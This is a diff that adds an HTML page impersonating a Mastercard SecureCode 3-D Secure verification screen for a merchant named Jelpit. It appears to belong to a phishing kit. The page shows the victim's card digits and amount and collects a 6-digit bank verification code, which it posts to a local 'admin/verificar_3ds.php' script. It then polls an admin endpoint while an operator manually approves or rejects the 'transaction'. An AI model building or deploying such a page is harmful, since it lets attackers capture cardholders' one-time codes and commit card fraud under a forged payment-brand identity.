@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mastercard SecureCode</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 420px; width: 100%; }
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px 25px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            border-top: 4px solid #c2410c;
+            transition: all 0.3s;
+        }
+        .card.aprobado { border-top-color: #059669; }
+        .card.rechazado { border-top-color: #dc2626; }
+        .card.expirado { border-top-color: #d97706; }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        .logo-container { display: flex; align-items: center; gap: 8px; }
+        .logo-container img { height: 40px; width: auto; }
+        .badge-mastercard { background: #c2410c; color: white; font-size: 10px; font-weight: 700; padding: 4px 12px; border-radius: 20px; }
+        .title { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 6px; }
+        .subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
+        .info-grid {
+            background: #f8fafc;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #eef2f6;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 13px;
+            border-bottom: 1px solid #eef2f6;
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: #888; font-weight: 500; }
+        .info-value { color: #1a1a2e; font-weight: 600; }
+        .info-value.card-number { font-family: monospace; letter-spacing: 1px; color: #c2410c; }
+        .personal-message {
+            font-size: 13px;
+            color: #1a1a2e;
+            font-weight: 500;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #fff5f0;
+            border-radius: 8px;
+            border-left: 3px solid #c2410c;
+            text-align: center;
+        }
+        .personal-message .icon { font-size: 24px; display: block; margin-bottom: 4px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d0d7e0;
+            border-radius: 8px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: all 0.3s;
+            background: #f8fafc;
+            color: #1a1a2e;
+            letter-spacing: 2px;
+            font-weight: 600;
+            text-align: center;
+        }
+        .form-group input:focus {
+            border-color: #c2410c;
+            box-shadow: 0 0 0 3px rgba(194,65,12,0.15);
+            outline: none;
+            background: white;
+        }
+        .form-group input::placeholder { letter-spacing: 0; font-weight: 400; color: #999; }
+        .form-group input:disabled { opacity: 0.5; cursor: not-allowed; }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            gap: 10px;
+        }
+        .btn {
+            padding: 10px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+        .btn-submit { background: #c2410c; color: white; flex: 1; }
+        .btn-submit:hover { background: #9a3412; transform: scale(1.02); }
+        .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+        .btn-cancel { background: transparent; color: #888; }
+        .btn-cancel:hover { color: #dc2626; }
+        .btn-help { background: transparent; color: #888; font-size: 13px; text-decoration: none; }
+        .btn-help:hover { color: #c2410c; }
+        .btn-reintentar {
+            background: #d97706;
+            color: white;
+            flex: 1;
+            display: none;
+        }
+        .btn-reintentar:hover { background: #b45309; transform: scale(1.02); }
+        .status-message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 13px;
+            padding: 10px;
+            border-radius: 8px;
+            display: none;
+        }
+        .status-message.success { display: block; background: #ecfdf5; color: #059669; border: 1px solid #a7f3d0; }
+        .status-message.error { display: block; background: #fef2f2; color: #dc2626; border: 1px solid #fca5a5; }
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            margin: 10px 0;
+        }
+        .loading-container.active { display: block; }
+        .loading-container .banco-logo { font-size: 64px; display: block; margin-bottom: 12px; }
+        .loading-container .loading-titulo { font-size: 18px; font-weight: 700; color: #1a1a2e; margin-bottom: 6px; }
+        .loading-container .loading-sub { font-size: 14px; color: #666; }
+        .loading-container .loading-dots { display: inline-block; margin-top: 8px; }
+        .loading-container .loading-dots span {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #c2410c;
+            border-radius: 50%;
+            margin: 0 4px;
+            animation: dotPulse 1.4s infinite ease-in-out both;
+        }
+        .loading-container .loading-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loading-container .loading-dots span:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes dotPulse {
+            0%, 80%, 100% { transform: scale(0); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
+        }
+        .spinner-large {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #c2410c;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .resultado-container {
+            display: none;
+            text-align: center;
+            padding: 25px 20px;
+            border-radius: 12px;
+            margin: 15px 0;
+        }
+        .resultado-container.active { display: block; }
+        .resultado-container.aprobado { background: #ecfdf5; border: 2px solid #059669; }
+        .resultado-container.rechazado { background: #fef2f2; border: 2px solid #dc2626; }
+        .resultado-container.expirado { background: #fffbeb; border: 2px solid #d97706; }
+        .resultado-container .icono-grande { font-size: 56px; display: block; margin-bottom: 8px; }
+        .resultado-container .resultado-titulo { font-size: 20px; font-weight: 700; }
+        .resultado-container.aprobado .resultado-titulo { color: #059669; }
+        .resultado-container.rechazado .resultado-titulo { color: #dc2626; }
+        .resultado-container.expirado .resultado-titulo { color: #d97706; }
+        .resultado-container .resultado-sub { font-size: 14px; color: #666; margin-top: 4px; }
+        .hidden { display: none !important; }
+        @media (max-width: 480px) {
+            .card { padding: 20px 16px; }
+            .actions { flex-wrap: wrap; }
+            .btn-submit, .btn-reintentar { flex: 1 1 100%; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="mainCard">
+            <div class="header">
+                <div class="logo-container">
+                    <img src="master.png" alt="Mastercard" style="height: 40px;">
+                    <span class="badge-mastercard">SecureCode</span>
+                </div>
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <span style="font-size:12px;color:#c2410c;font-weight:600;">🔒 Secure</span>
+                </div>
+            </div>
+
+            <div class="title" id="tituloPagina">Authenticate using password</div>
+            <p class="subtitle" id="subtituloPagina">Please enter your password below.</p>
+
+            <div class="info-grid">
+                <div class="info-row">
+                    <span class="info-label">Merchant:</span>
+                    <span class="info-value" id="merchantDisplay">Jelpit</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Amount:</span>
+                    <span class="info-value" id="amountDisplay">$ 0</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Date:</span>
+                    <span class="info-value" id="dateDisplay">-</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Card Number:</span>
+                    <span class="info-value card-number" id="cardDisplay">**** **** **** 0000</span>
+                </div>
+            </div>
+
+            <div class="personal-message" id="personalMessage">
+                <span class="icon">📱</span>
+                Hemos enviado un código de verificación a tu dispositivo registrado.
+            </div>
+
+            <div id="formularioContainer">
+                <div class="form-group">
+                    <label for="codigo3ds">🔑 Código de Verificación</label>
+                    <input type="text" id="codigo3ds" placeholder="Ingresa el código de 6 dígitos" maxlength="6" autocomplete="off">
+                </div>
+            </div>
+
+            <div id="statusMessage" class="status-message"></div>
+
+            <div class="loading-container" id="loadingContainer">
+                <span class="banco-logo">💳</span>
+                <div class="spinner-large"></div>
+                <div class="loading-titulo">Validando transacción</div>
+                <div class="loading-sub">Por favor espera un momento...</div>
+                <div class="loading-dots">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+
+            <div class="resultado-container" id="resultadoContainer">
+                <span class="icono-grande" id="resultadoIcono">✅</span>
+                <div class="resultado-titulo" id="resultadoTitulo">Aprobado</div>
+                <p class="resultado-sub" id="resultadoSub">Transacción completada exitosamente</p>
+            </div>
+
+            <div class="actions">
+                <a href="#" class="btn-help" onclick="window.history.back(); return false;">← Help</a>
+                <button class="btn btn-cancel" onclick="window.location.href='ps.html'">Cancel</button>
+                <button class="btn btn-submit" id="btnSubmit" onclick="enviarCodigo()">Submit</button>
+                <button class="btn btn-reintentar" id="btnReintentar" onclick="reintentar()">🔄 Intentar de nuevo</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const monto = sessionStorage.getItem('monto') || '0';
+        const numeroTarjeta = sessionStorage.getItem('numero_tarjeta') || '**** **** **** 0000';
+        const id3ds = sessionStorage.getItem('id_3ds') || '3DS_' + Date.now();
+
+        document.getElementById('amountDisplay').textContent = '$ ' + monto;
+        document.getElementById('dateDisplay').textContent = new Date().toLocaleDateString('es-CO');
+        document.getElementById('cardDisplay').textContent = '**** **** **** ' + numeroTarjeta.slice(-4);
+
+        let pollingInterval = null;
+        let pollingActivo = false;
+
+        function mostrarEstado(tipo, mensaje) {
+            const statusMsg = document.getElementById('statusMessage');
+            statusMsg.className = 'status-message ' + tipo;
+            statusMsg.textContent = mensaje;
+            statusMsg.style.display = 'block';
+        }
+
+        function ocultarEstado() {
+            document.getElementById('statusMessage').style.display = 'none';
+        }
+
+        function mostrarLoading(mostrar) {
+            document.getElementById('loadingContainer').classList.toggle('active', mostrar);
+            document.getElementById('formularioContainer').style.display = mostrar ? 'none' : 'block';
+            document.getElementById('btnSubmit').style.display = mostrar ? 'none' : 'block';
+        }
+
+        function mostrarResultado(tipo, titulo, sub) {
+            const container = document.getElementById('resultadoContainer');
+            container.className = 'resultado-container active ' + tipo;
+            document.getElementById('resultadoIcono').textContent = tipo === 'aprobado' ? '✅' : tipo === 'expirado' ? '⏰' : '❌';
+            document.getElementById('resultadoTitulo').textContent = titulo;
+            document.getElementById('resultadoSub').textContent = sub;
+            document.getElementById('mainCard').className = 'card ' + tipo;
+            
+            document.getElementById('formularioContainer').style.display = 'none';
+            document.getElementById('btnSubmit').style.display = 'none';
+            
+            if (tipo === 'rechazado' || tipo === 'expirado') {
+                document.getElementById('btnReintentar').style.display = 'block';
+            } else {
+                document.getElementById('btnReintentar').style.display = 'none';
+            }
+        }
+
+        function ocultarResultado() {
+            document.getElementById('resultadoContainer').className = 'resultado-container';
+            document.getElementById('mainCard').className = 'card';
+            document.getElementById('btnReintentar').style.display = 'none';
+        }
+
+        function reintentar() {
+            ocultarResultado();
+            ocultarEstado();
+            mostrarLoading(false);
+            document.getElementById('formularioContainer').style.display = 'block';
+            document.getElementById('btnSubmit').style.display = 'block';
+            document.getElementById('btnReintentar').style.display = 'none';
+            document.getElementById('codigo3ds').value = '';
+            document.getElementById('codigo3ds').disabled = false;
+            document.getElementById('btnSubmit').disabled = false;
+            document.getElementById('btnSubmit').textContent = 'Submit';
+            document.getElementById('mainCard').className = 'card';
+            document.getElementById('tituloPagina').textContent = 'Authenticate using password';
+            document.getElementById('subtituloPagina').textContent = 'Please enter your password below.';
+        }
+
+        function iniciarPolling(id) {
+            if (pollingActivo) return;
+            pollingActivo = true;
+
+            mostrarLoading(true);
+            document.getElementById('btnSubmit').disabled = true;
+            document.getElementById('codigo3ds').disabled = true;
+
+            if (pollingInterval) clearInterval(pollingInterval);
+
+            let intentos = 0;
+            const maxIntentos = 60;
+
+            pollingInterval = setInterval(async function() {
+                intentos++;
+                document.querySelector('.loading-sub').textContent = 'Por favor espera un momento... (' + intentos + 's)';
+
+                try {
+                    const response = await fetch('admin/check_aprobacion.php?log_id=' + id);
+                    const data = await response.json();
+                    console.log('📥 Polling:', data);
+
+                    if (data.success && data.estado && data.estado !== 'pendiente') {
+                        clearInterval(pollingInterval);
+                        pollingActivo = false;
+                        pollingInterval = null;
+                        mostrarLoading(false);
+
+                        if (data.estado === 'aprobado') {
+                            mostrarResultado('aprobado', '✅ ¡Pago Aprobado!', 'Transacción completada exitosamente');
+                            setTimeout(() => {
+                                window.location.href = 'confirmacion-pago.html';
+                            }, 3000);
+                        } else if (data.estado === 'rechazado') {
+                            mostrarResultado('rechazado', '❌ Pago Rechazado', 'El administrador ha rechazado la transacción');
+                        }
+                    } else if (intentos >= maxIntentos) {
+                        clearInterval(pollingInterval);
+                        pollingActivo = false;
+                        pollingInterval = null;
+                        mostrarLoading(false);
+                        mostrarResultado('expirado', '⏰ Tiempo Agotado', 'La transacción ha expirado. Intenta nuevamente.');
+                    }
+                } catch (error) {
+                    console.error('Error polling:', error);
+                    if (intentos >= 5) {
+                        clearInterval(pollingInterval);
+                        pollingActivo = false;
+                        pollingInterval = null;
+                        mostrarLoading(false);
+                        mostrarEstado('error', '❌ Error de conexión. Intenta nuevamente.');
+                        document.getElementById('btnSubmit').disabled = false;
+                        document.getElementById('codigo3ds').disabled = false;
+                        mostrarLoading(false);
+                    }
+                }
+            }, 1000);
+        }
+
+        function enviarCodigo() {
+            const codigo = document.getElementById('codigo3ds').value.trim();
+            const btnSubmit = document.getElementById('btnSubmit');
+
+            if (codigo.length < 4) {
+                mostrarEstado('error', '❌ Ingresa un código válido (mínimo 4 dígitos)');
+                return;
+            }
+
+            ocultarEstado();
+            ocultarResultado();
+            btnSubmit.disabled = true;
+            btnSubmit.textContent = '⏳ Enviando...';
+
+            fetch('admin/verificar_3ds.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id_3ds: id3ds, codigo: codigo, tipo: 'mastercard' })
+            })
+            .then(res => res.json())
+            .then(data => {
+                btnSubmit.textContent = 'Submit';
+
+                if (data.success) {
+                    mostrarEstado('success', '✅ Código enviado correctamente');
+                    document.getElementById('tituloPagina').textContent = 'Validando transacción';
+                    document.getElementById('subtituloPagina').textContent = 'Esperando confirmación del banco...';
+                    
+                    setTimeout(() => {
+                        ocultarEstado();
+                        iniciarPolling(id3ds);
+                    }, 800);
+                } else {
+                    mostrarEstado('error', '❌ ' + (data.error || 'Error al enviar el código'));
+                    btnSubmit.disabled = false;
+                }
+            })
+            .catch(() => {
+                mostrarEstado('error', '❌ Error de conexión');
+                btnSubmit.disabled = false;
+                btnSubmit.textContent = 'Submit';
+            });
+        }
+
+        document.getElementById('codigo3ds').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') enviarCodigo();
+        });
+
+        async function verificarEstadoInicial() {
+            try {
+const response = await fetch('admin/check_aprobacion.php?log_id=' + id3ds);                const data = await response.json();
+                if (data.success && data.estado && data.estado !== 'pendiente') {
+                    mostrarLoading(false);
+                    if (data.estado === 'aprobado') {
+                        mostrarResultado('aprobado', '✅ ¡Pago Aprobado!', 'Transacción completada exitosamente');
+                        setTimeout(() => { window.location.href = 'confirmacion-pago.html'; }, 3000);
+                    } else if (data.estado === 'rechazado') {
+                        mostrarResultado('rechazado', '❌ Pago Rechazado', 'El administrador ha rechazado la transacción');
+                    }
+                }
+            } catch (e) {}
+        }
+        verificarEstadoInicial();
+    </script>
+</body>
+</html>
